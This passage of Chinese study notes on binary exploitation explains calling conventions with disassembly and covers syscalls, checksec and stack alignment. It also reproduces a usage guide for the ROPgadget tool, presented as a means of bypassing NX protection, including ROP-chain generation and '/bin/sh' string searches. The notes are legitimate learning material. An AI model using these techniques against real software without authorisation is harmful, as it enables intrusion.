class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">func1</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __stdcall <span class="title function_">func2</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __fastcall <span class="title function_">func3</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> a, b;</span><br><span class="line">a = <span class="number">2</span>;</span><br><span class="line">b = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">func1(a, b);</span><br><span class="line">func2(a, b);</span><br><span class="line">func3(a, b);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>VS:</p><p>发现64位没有任何区别</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">int main() &#123;</span><br><span class="line">00007FF615301880  push        rbp  </span><br><span class="line">00007FF615301882  push        rdi  </span><br><span class="line">00007FF615301883  sub         rsp,128h  </span><br><span class="line">00007FF61530188A  lea         rbp,[rsp+20h]  </span><br><span class="line">00007FF61530188F  lea         rcx,[__CC37DA75_a@c (07FF615311008h)]  </span><br><span class="line">00007FF615301896  call        __CheckForDebuggerJustMyCode (07FF615301361h)  </span><br><span class="line">00007FF61530189B  nop  </span><br><span class="line">int a, b;</span><br><span class="line">a = 2;</span><br><span class="line">00007FF61530189C  mov         dword ptr [a],2  </span><br><span class="line">b = 3;</span><br><span class="line">00007FF6153018A3  mov         dword ptr [b],3  </span><br><span class="line"></span><br><span class="line">func1(a, b);</span><br><span class="line">00007FF6153018AA  mov         edx,dword ptr [b]  </span><br><span class="line">00007FF6153018AD  mov         ecx,dword ptr [a]  </span><br><span class="line">00007FF6153018B0  call        func1 (07FF61530114Fh)  </span><br><span class="line">00007FF6153018B5  nop  </span><br><span class="line">func2(a, b);</span><br><span class="line">00007FF6153018B6  mov         edx,dword ptr [b]  </span><br><span class="line">00007FF6153018B9  mov         ecx,dword ptr [a]  </span><br><span class="line">00007FF6153018BC  call        func2 (07FF61530102Dh)  </span><br><span class="line">00007FF6153018C1  nop  </span><br><span class="line">func3(a, b);</span><br><span class="line">00007FF6153018C2  mov         edx,dword ptr [b]  </span><br><span class="line">00007FF6153018C5  mov         ecx,dword ptr [a]  </span><br><span class="line">00007FF6153018C8  call        func3 (07FF61530129Eh)  </span><br><span class="line">00007FF6153018CD  nop  </span><br><span class="line">return 0;</span><br><span class="line">00007FF6153018CE  xor         eax,eax  </span><br><span class="line">&#125;</span><br><span class="line">00007FF6153018D0  lea         rsp,[rbp+108h]  </span><br><span class="line">00007FF6153018D7  pop         rdi  </span><br><span class="line">00007FF6153018D8  pop         rbp  </span><br><span class="line">00007FF6153018D9  ret  </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">int main() &#123;</span><br><span class="line">00CD1890  push        ebp  </span><br><span class="line">00CD1891  mov         ebp,esp  </span><br><span class="line">00CD1893  sub         esp,0D8h  </span><br><span class="line">00CD1899  push        ebx  </span><br><span class="line">00CD189A  push        esi  </span><br><span class="line">00CD189B  push        edi  </span><br><span class="line">00CD189C  lea         edi,[ebp-18h]  </span><br><span class="line">00CD189F  mov         ecx,6  </span><br><span class="line">00CD18A4  mov         eax,0CCCCCCCCh  </span><br><span class="line">00CD18A9  rep stos    dword ptr es:[edi]  </span><br><span class="line">00CD18AB  mov         ecx,offset _CC37DA75_a@c (0CDC008h)  </span><br><span class="line">00CD18B0  call        @__CheckForDebuggerJustMyCode@4 (0CD1325h)  </span><br><span class="line">00CD18B5  nop  </span><br><span class="line">int a, b;</span><br><span class="line">a = 2;</span><br><span class="line">00CD18B6  mov         dword ptr [a],2  </span><br><span class="line">b = 3;</span><br><span class="line">00CD18BD  mov         dword ptr [b],3  </span><br><span class="line"></span><br><span class="line">func1(a, b);</span><br><span class="line">00CD18C4  mov         eax,dword ptr [b]  </span><br><span class="line">00CD18C7  push        eax  </span><br><span class="line">00CD18C8  mov         ecx,dword ptr [a]  </span><br><span class="line">00CD18CB  push        ecx  </span><br><span class="line">00CD18CC  call        _func1 (0CD1366h)  </span><br><span class="line">00CD18D1  add         esp,8  </span><br><span class="line">func2(a, b);</span><br><span class="line">00CD18D4  mov         eax,dword ptr [b]  </span><br><span class="line">00CD18D7  push        eax  </span><br><span class="line">00CD18D8  mov         ecx,dword ptr [a]  </span><br><span class="line">00CD18DB  push        ecx  </span><br><span class="line">00CD18DC  call        _func2@8 (0CD105Fh)  </span><br><span class="line">00CD18E1  nop  </span><br><span class="line">func3(a, b);</span><br><span class="line">00CD18E2  mov         edx,dword ptr [b]  </span><br><span class="line">00CD18E5  mov         ecx,dword ptr [a]  </span><br><span class="line">00CD18E8  call        @func3@8 (0CD105Ah)  </span><br><span class="line">00CD18ED  nop  </span><br><span class="line">return 0;</span><br><span class="line">00CD18EE  xor         eax,eax  </span><br><span class="line">&#125;</span><br><span class="line">00CD18F0  pop         edi  </span><br><span class="line">00CD18F1  pop         esi  </span><br><span class="line">00CD18F2  pop         ebx  </span><br><span class="line">00CD18F3  add         esp,0D8h  </span><br><span class="line">00CD18F9  cmp         ebp,esp  </span><br><span class="line">00CD18FB  call        __RTC_CheckEsp (0CD1249h)  </span><br><span class="line">00CD1900  mov         esp,ebp  </span><br><span class="line">00CD1902  pop         ebp  </span><br><span class="line">00CD1903  ret  </span><br></pre></td></tr></table></figure><p>可以看出对于cdecl的func1，它push了两次4字节后，在主调函数add了回来(栈是反的)<br>而func2和func3都没有这个步骤，说明cdecl使得主调函数去保持栈平衡。<br>同时func3会先把参数传给寄存器。说明fastcall的目的是先不使用栈而是寄存器传参。</p><p>在func2内部：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">int __stdcall func2(int a, int b) &#123;</span><br><span class="line">00CD1840  push        ebp  </span><br><span class="line">00CD1841  mov         ebp,esp  </span><br><span class="line">00CD1843  sub         esp,0C0h  </span><br><span class="line">00CD1849  push        ebx  </span><br><span class="line">00CD184A  push        esi  </span><br><span class="line">00CD184B  push        edi  </span><br><span class="line">00CD184C  mov         edi,ebp  </span><br><span class="line">00CD184E  xor         ecx,ecx  </span><br><span class="line">00CD1850  mov         eax,0CCCCCCCCh  </span><br><span class="line">00CD1855  rep stos    dword ptr es:[edi]  </span><br><span class="line">00CD1857  mov         ecx,offset _CC37DA75_a@c (0CDC008h)  </span><br><span class="line">00CD185C  call        @__CheckForDebuggerJustMyCode@4 (0CD1325h)  </span><br><span class="line">00CD1861  nop  </span><br><span class="line">return a + b;</span><br><span class="line">00CD1862  mov         eax,dword ptr [a]  </span><br><span class="line">00CD1865  add         eax,dword ptr [b]  </span><br><span class="line">&#125;</span><br><span class="line">00CD1868  pop         edi  </span><br><span class="line">00CD1869  pop         esi  </span><br><span class="line">00CD186A  pop         ebx  </span><br><span class="line">00CD186B  add         esp,0C0h  </span><br><span class="line">00CD1871  cmp         ebp,esp  </span><br><span class="line">00CD1873  call        __RTC_CheckEsp (0CD1249h)  </span><br><span class="line">00CD1878  mov         esp,ebp  </span><br><span class="line">00CD187A  pop         ebp  </span><br><span class="line">00CD187B  ret         8  </span><br></pre></td></tr></table></figure><p>这个ret 8表示返回时弹出栈顶8字节:     C3 xx xx</p><p>然后是研究fastcall前几个参数都是给哪些寄存器存放的<br>x86：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">func3(a, b, a, b, b, a, b, a, a, b, a, a, b, a);</span><br><span class="line">00B618D2  mov         eax,dword ptr [a]  </span><br><span class="line">00B618D5  push        eax  </span><br><span class="line">00B618D6  mov         ecx,dword ptr [b]  </span><br><span class="line">00B618D9  push        ecx  </span><br><span class="line">00B618DA  mov         edx,dword ptr [a]  </span><br><span class="line">00B618DD  push        edx  </span><br><span class="line">00B618DE  mov         eax,dword ptr [a]  </span><br><span class="line">00B618E1  push        eax  </span><br><span class="line">00B618E2  mov         ecx,dword ptr [b]  </span><br><span class="line">00B618E5  push        ecx  </span><br><span class="line">00B618E6  mov         edx,dword ptr [a]  </span><br><span class="line">00B618E9  push        edx  </span><br><span class="line">00B618EA  mov         eax,dword ptr [a]  </span><br><span class="line">00B618ED  push        eax  </span><br><span class="line">00B618EE  mov         ecx,dword ptr [b]  </span><br><span class="line">00B618F1  push        ecx  </span><br><span class="line">00B618F2  mov         edx,dword ptr [a]  </span><br><span class="line">00B618F5  push        edx  </span><br><span class="line">00B618F6  mov         eax,dword ptr [b]  </span><br><span class="line">00B618F9  push        eax  </span><br><span class="line">00B618FA  mov         ecx,dword ptr [b]  </span><br><span class="line">00B618FD  push        ecx  </span><br><span class="line">00B618FE  mov         edx,dword ptr [a]  </span><br><span class="line">00B61901  push        edx  </span><br><span class="line">00B61902  mov         edx,dword ptr [b]  </span><br><span class="line">00B61905  mov         ecx,dword ptr [a]  </span><br><span class="line">00B61908  call        @func3@56 (0B613C0h)  </span><br><span class="line">00B6190D  nop  </span><br></pre></td></tr></table></figure><p>参数先从右至左依次压栈，然后最左侧两个参数分别存在ecx和edx<br>在x64下，依然是从右至左依次压栈，最左侧4个参数分别存在rcx，rdx，r8，r9寄存器中</p><p>linux下：</p><p>分别为rdi,rsi,rdx,rcx,r8,r9</p><h4 id="补充">补充</h4><p>在<a href="https://blog.csdn.net/a3192048/article/details/82084374">调用约定__cdecl、__stdcall和__fastcall的区别_win call stdcall-CSDN博客</a>这篇上看到了这些说法：</p><blockquote><h2 id="cdecl的特点">__cdecl的特点</h2><p>__cdecl 是 C Declaration 的缩写，表示 C 和 C++ 默认的函数调用约定。是C/C++和MFCX的默认调用约定。</p><ul><li>按从右至左的顺序压参数入栈、。</li><li>由调用者把参数弹出栈。切记：对于传送参数的内存栈是由调用者来维护的，返回值在EAX中。因此对于像printf这样可变参数的函数必须用这种约定。</li><li>编译器在编译的时候对这种调用规则的函数生成修饰名的时候，在输出函数名前加上一个下划线前缀，格式为_function。如函数int add(int a, int b)的修饰名是_add。</li></ul><p>(1).为了验证参数是从右至左的顺序压栈的，我们可以看下面这段代码，Debug进行单步调试,可以看到我们的调用栈会先进入GetC()，再进入GetB()，最后进入GetA()。</p><p>(2).第二点“调用者把参数弹出栈”，这是编译器的工作，暂时没办法验证。要深入了解这部分，需要学习汇编语言相关的知识。</p><p>(3).函数的修饰名，这个可以通过对编译出的dll使用VS的”dumpbin /exports <em>ProjectName</em>.dll”命令进行查看(后面章节会进行详细介绍)，或直接打开.obj文件查找对应的方法名(如搜索add)。</p><p>从代码和程序调试的层面考虑，参数的压栈顺序和栈的清理我们都不用太观注，因为这是编译器的决定的，我们改变不了。但第三点却常常困扰我们，因为如果不弄清楚这点，在多个库之间(如dll、lib、exe)相互调用、依赖时常常出出现莫名其妙的错误。</p></blockquote><blockquote><h2 id="stdcall的特点">__stdcall的特点</h2><p>__stdcall是Standard Call的缩写，是C++的标准调用方式,当然这是微软定义的标准，__stdcall通常用于Win32 API中(可查看WINAPI的定义)。  <strong>microsoft的vc默认的是__cdecl方式，而windows API则是__stdcall，如果用vc开发dll给其他语言用，则应该指定__stdcall方式。堆栈由谁清除这个很重要，如果是要写汇编函数给C调用，一定要小心堆栈的清除工作，如果是__cdecl方式的函数，则函数本身（如果不用汇编写）则不需要关心保存参数的堆栈的清除，但是如果是__stdcall的规则，一定要在函数退出(ret)前恢复堆栈。</strong></p><ul><li>按从右至左的顺序压参数入栈。</li><li>由被调用者把参数弹出栈。切记：函数自己在退出时清空堆栈，返回值在EAX中。</li><li>__stdcall调用约定在输出函数名前加上一个下划线前缀，后面加上一个“@”符号和其参数的字节数，格式为_function@number。如函数int sub(int a, int b)的修饰名是_sub@8。</li></ul></blockquote><blockquote><h2 id="fastcall的特点">__fastcall的特点</h2><p>__fastcall调用的主要特点就是快，因为它是通过寄存器来传送参数的。</p><ul><li>实际上__fastcall用ECX和EDX传送前两个DWORD或更小的参数，剩下的参数仍自右向左压栈传送，被调用的函数在返回前清理传送参数的内存栈。</li><li>__fastcall调用约定在输出函数名前加上一个“@”符号，后面也是一个“@”符号和其参数的字节数，格式为@function@number,如double multi(double a, double b)的修饰名是@multi@16。</li><li>__fastcall和__stdcall很象，唯一差别就是头两个参数通过寄存器传送。注意通过寄存器传送的两个参数是从左向右的，即第1个参数进ECX，第2个进EDX，其他参数是从右向左的入栈，返回仍然通过EAX。</li></ul></blockquote><blockquote><h2 id="thiscall">__thiscall</h2><p>__thiscall是C++类成员函数缺省的调用约定，但它没有显示的声明形式。因为在C++类中，成员函数调用还有一个this指针参数，因此必须特殊处理，thiscall调用约定的特点：</p><ul><li>参数入栈：参数从右向左入栈</li><li>this指针入栈：如果参数个数确定，this指针通过ecx传递给被调用者；如果参数个数不确定，this指针在所有参数压栈后被压入栈。</li><li>栈恢复：对参数个数不定的，调用者清理栈，否则函数自己清理栈。</li></ul></blockquote><h3 id="SYSCALL">SYSCALL</h3><p>系统调用是用户层调用内核层函数的接口<br>使用系统调用需要遵循一定格式。</p><p>内核中有一个系统调用表，是内核函数的指针数组。对应函数在数组中的下标为系统调用号。使用SYSCALL时</p><p>rax寄存器中存放调用号，参数放在：ebx，ecx，edx，esi，edi</p><p>windows上触发为int 2E;Linux上为int 80;</p><p>尝试在windows上调用，失败。</p><h2 id="ROPgadget">ROPgadget</h2><p>通过ROP即面向返回的编程可以实现对NX保护的绕过。ROPgadget是一个用来寻找gadgets的工具</p><p>安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python-capstone</span><br><span class="line">git clone https://github.com/JonathanSalwan/ROPgadget.git</span><br><span class="line">cd ROPgadget</span><br><span class="line">sudo python setup.py install</span><br><span class="line">ROPgadget --help</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary 程序名称 | grep &quot;汇编指令&quot;</span><br></pre></td></tr></table></figure><p>如</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary 文件名 | grep rdi</span><br></pre></td></tr></table></figure><p>获得所有和rdi有关的指令地址</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary 文件名 --only &quot;pop|ret&quot;</span><br></pre></td></tr></table></figure><p>获得所有和pop或者retrdi有关的地址</p><p><a href="https://leeyuxun.github.io/ROPgadget%E4%BB%8B%E7%BB%8D.html#:~:text=ROPgadget">ROPgadget 介绍 | Leeyuxun の note</a><br>这篇很不错，怕丢了，复制一下：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">usage: ROPgadget <span class="comment">[-h]</span> <span class="comment">[-v]</span> <span class="comment">[-c]</span> <span class="comment">[--binary &lt;binary&gt;]</span> <span class="comment">[--opcode &lt;opcodes&gt;]</span></span><br><span class="line">                 <span class="comment">[--string &lt;string&gt;]</span> <span class="comment">[--memstr &lt;string&gt;]</span> <span class="comment">[--depth &lt;nbyte&gt;]</span></span><br><span class="line">                 <span class="comment">[--only &lt;key&gt;]</span> <span class="comment">[--filter &lt;key&gt;]</span> <span class="comment">[--range &lt;start-end&gt;]</span></span><br><span class="line">                 <span class="comment">[--badbytes &lt;byte&gt;]</span> <span class="comment">[--rawArch &lt;arch&gt;]</span> <span class="comment">[--rawMode &lt;mode&gt;]</span></span><br><span class="line">                 <span class="comment">[--rawEndian &lt;endian&gt;]</span> <span class="comment">[--re &lt;re&gt;]</span> <span class="comment">[--offset &lt;hexaddr&gt;]</span></span><br><span class="line">                 <span class="comment">[--ropchain]</span> <span class="comment">[--thumb]</span> <span class="comment">[--console]</span> <span class="comment">[--norop]</span> <span class="comment">[--nojop]</span></span><br><span class="line">                 <span class="comment">[--callPreceded]</span> <span class="comment">[--nosys]</span> <span class="comment">[--multibr]</span> <span class="comment">[--all]</span> <span class="comment">[--noinstr]</span></span><br><span class="line">                 <span class="comment">[--dump]</span> <span class="comment">[--silent]</span> <span class="comment">[--align ALIGN]</span> <span class="comment">[--mipsrop &lt;rtype&gt;]</span></span><br></pre></td></tr></table></figure><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">-h, <span class="comment">--help           显示帮助文档</span></span><br><span class="line">-v, <span class="comment">--version        版本号</span></span><br><span class="line">-c, <span class="comment">--checkUpdate    检测新版本是否可用</span></span><br><span class="line"><span class="comment">--binary &lt;binary&gt;    指定二进制文件进行分析</span></span><br><span class="line"><span class="comment">--opcode &lt;opcodes&gt;   在可执行段中查找opcode</span></span><br><span class="line"><span class="comment">--string &lt;string&gt;    在可读的段中查找字符串</span></span><br><span class="line"><span class="comment">--memstr &lt;string&gt;    查找单个byte在所有的可执行段中</span></span><br><span class="line"><span class="comment">--depth &lt;nbyte&gt;      搜索引擎的深度(默认10)</span></span><br><span class="line"><span class="comment">--only &lt;key&gt;         只显示特别的指令</span></span><br><span class="line"><span class="comment">--filter &lt;key&gt;       过滤特定指令</span></span><br><span class="line"><span class="comment">--range &lt;start-end&gt;  在地址之间寻找(0x...-0x...)</span></span><br><span class="line"><span class="comment">--badbytes &lt;byte&gt;    拒绝特定指令在gadget的地址下</span></span><br><span class="line"><span class="comment">--rawArch &lt;arch&gt;     指定文件架构: x86|arm|arm64|sparc|mips|ppc</span></span><br><span class="line"><span class="comment">--rawMode &lt;mode&gt;     指定源文件的mode: 32|64|arm|thumb</span></span><br><span class="line"><span class="comment">--rawEndian &lt;endian&gt; 指定源文件的字节顺序: little|big</span></span><br><span class="line"><span class="comment">--re &lt;re&gt;            正则表达式</span></span><br><span class="line"><span class="comment">--offset &lt;hexaddr&gt;   指定gadget的地址偏移</span></span><br><span class="line"><span class="comment">--ropchain           ROP链的生成</span></span><br><span class="line"><span class="comment">--thumb              在ARM架构下使用搜索引擎thumb 模式</span></span><br><span class="line"><span class="comment">--console            使用交互终端对于搜索引擎</span></span><br><span class="line"><span class="comment">--norop              禁止ROP搜索引擎</span></span><br><span class="line"><span class="comment">--nojop              禁止JOP搜索引擎</span></span><br><span class="line"><span class="comment">--callPreceded       仅显示call-preceded的gadgets</span></span><br><span class="line"><span class="comment">--nosys              禁止SYS搜索引擎</span></span><br><span class="line"><span class="comment">--multibr            允许多分枝gadgets</span></span><br><span class="line"><span class="comment">--all                禁止删除重复的gadgets，即显示所有</span></span><br><span class="line"><span class="comment">--noinstr            禁止gadget指令终端打印</span></span><br><span class="line"><span class="comment">--dump               输出gadget bytes</span></span><br><span class="line"><span class="comment">--align ALIGN        对齐gadget地址（以字节为单位）</span></span><br><span class="line"><span class="comment">--mipsrop &lt;rtype&gt;    MIPSj架构下有用的gadget查找器: stackfinder|system|tails|lia0|registers</span></span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget<span class="selector-class">.py</span> <span class="attr">--binary</span> ./test-suite-binaries/elf-Linux-x86</span><br><span class="line">ROPgadget<span class="selector-class">.py</span> <span class="attr">--binary</span> ./test-suite-binaries/elf-Linux-x86 <span class="attr">--ropchain</span></span><br><span class="line">ROPgadget<span class="selector-class">.py</span> <span class="attr">--binary</span> ./test-suite-binaries/elf-Linux-x86 <span class="attr">--depth</span> <span class="number">3</span></span><br><span class="line">ROPgadget<span class="selector-class">.py</span> <span class="attr">--binary</span> ./test-suite-binaries/elf-Linux-x86 <span class="attr">--string</span> <span class="string">&quot;main&quot;</span></span><br><span class="line">ROPgadget<span class="selector-class">.py</span> <span class="attr">--binary</span> ./test-suite-binaries/elf-Linux-x86 <span class="attr">--string</span> <span class="string">&quot;m..n&quot;</span></span><br><span class="line">ROPgadget<span class="selector-class">.py</span> <span class="attr">--binary</span> ./test-suite-binaries/elf-Linux-x86 <span class="attr">--opcode</span> c9c3</span><br><span class="line">ROPgadget<span class="selector-class">.py</span> <span class="attr">--binary</span> ./test-suite-binaries/elf-Linux-x86 <span class="attr">--only</span> <span class="string">&quot;mov|ret&quot;</span></span><br><span class="line">ROPgadget<span class="selector-class">.py</span> <span class="attr">--binary</span> ./test-suite-binaries/elf-Linux-x86 <span class="attr">--only</span> <span class="string">&quot;mov|pop|xor|ret&quot;</span></span><br><span class="line">ROPgadget<span class="selector-class">.py</span> <span class="attr">--binary</span> ./test-suite-binaries/elf-Linux-x86 <span class="attr">--filter</span> <span class="string">&quot;xchg|add|sub|cmov.*&quot;</span></span><br><span class="line">ROPgadget<span class="selector-class">.py</span> <span class="attr">--binary</span> ./test-suite-binaries/elf-Linux-x86 <span class="attr">--norop</span> <span class="attr">--nosys</span></span><br><span class="line">ROPgadget<span class="selector-class">.py</span> <span class="attr">--binary</span> ./test-suite-binaries/elf-Linux-x86 <span class="attr">--range</span> <span class="number">0</span>x08041000-<span class="number">0</span>x08042000</span><br><span class="line">ROPgadget<span class="selector-class">.py</span> <span class="attr">--binary</span> ./test-suite-binaries/elf-Linux-x86 <span class="attr">--string</span> <span class="selector-tag">main</span> <span class="attr">--range</span> <span class="number">0</span>x080c9aaa-<span class="number">0</span>x080c9aba</span><br><span class="line">ROPgadget<span class="selector-class">.py</span> <span class="attr">--binary</span> ./test-suite-binaries/elf-Linux-x86 <span class="attr">--memstr</span> <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">ROPgadget<span class="selector-class">.py</span> <span class="attr">--binary</span> ./test-suite-binaries/elf-Linux-x86 <span class="attr">--console</span></span><br><span class="line">ROPgadget<span class="selector-class">.py</span> <span class="attr">--binary</span> ./test-suite-binaries/elf-Linux-x86 <span class="attr">--badbytes</span> <span class="string">&quot;00|01-1f|7f|42&quot;</span></span><br><span class="line">ROPgadget<span class="selector-class">.py</span> <span class="attr">--binary</span> ./test-suite-binaries/Linux_lib64<span class="selector-class">.so</span> <span class="attr">--offset</span> <span class="number">0</span>xdeadbeef00000000</span><br><span class="line">ROPgadget<span class="selector-class">.py</span> <span class="attr">--binary</span> ./test-suite-binaries/elf-ARMv7-ls <span class="attr">--depth</span> <span class="number">5</span></span><br><span class="line">ROPgadget<span class="selector-class">.py</span> <span class="attr">--binary</span> ./test-suite-binaries/elf-ARM64-bash <span class="attr">--depth</span> <span class="number">5</span></span><br><span class="line">ROPgadget<span class="selector-class">.py</span> <span class="attr">--binary</span> ./test-suite-binaries/raw-x86<span class="selector-class">.raw</span> <span class="attr">--rawArch</span>=x86 <span class="attr">--rawMode</span>=<span class="number">32</span></span><br></pre></td></tr></table></figure><h2 id="checksec">checksec</h2><p>pwntool中用来检查程序开启了什么保护的指令</p><p>直接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e = ELF(“xxx”)</span><br><span class="line">e.checksec()</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Arch:</span>     <span class="string">amd64-64-little</span></span><br><span class="line"><span class="attr">RELRO:</span>    <span class="string">Partial</span> <span class="string">RELRO</span></span><br><span class="line"><span class="attr">Stack:</span>    <span class="literal">No</span> <span class="string">canary</span> <span class="string">found</span></span><br><span class="line"><span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span></span><br><span class="line"><span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x400000)</span></span><br></pre></td></tr></table></figure><h2 id="栈的字节对齐">栈的字节对齐</h2><p>这里有一篇写的很好<br><a href="https://www.cnblogs.com/tcctw/p/11333743.html#:~:text=%E6%97%A0%E8%AE%BA%E6%95%B0%E6%8D%AE%E6%98%AF%E5%90%A6%E5%AF%B9%E9%BD%90%EF%BC%8Cx">x86_64 Linux 运行时栈的字节对齐 - 一川official - 博客园 (cnblogs.com)</a></p><blockquote><p>栈的字节对齐，实际是指栈顶指针必须是16字节的整数倍。栈对齐使得在尽可能少的内存访问周期内读取数据，不对齐堆栈指针可能导致严重的性能下降。</p><p>上文我们说，即使数据没有对齐，我们的程序也是可以执行的，只是效率有点低而已，但是某些型号的Intel和AMD处理器，在执行某些实现多媒体操作的SSE指令时，如果数据没有对齐，将无法正确执行。这些指令对16字节内存进行操作，在SSE单元和内存之间传送数据的指令要求内存地址必须是16的倍数。</p><p>因此，任何针对x86_64处理器的编译器和运行时系统都必须保证， 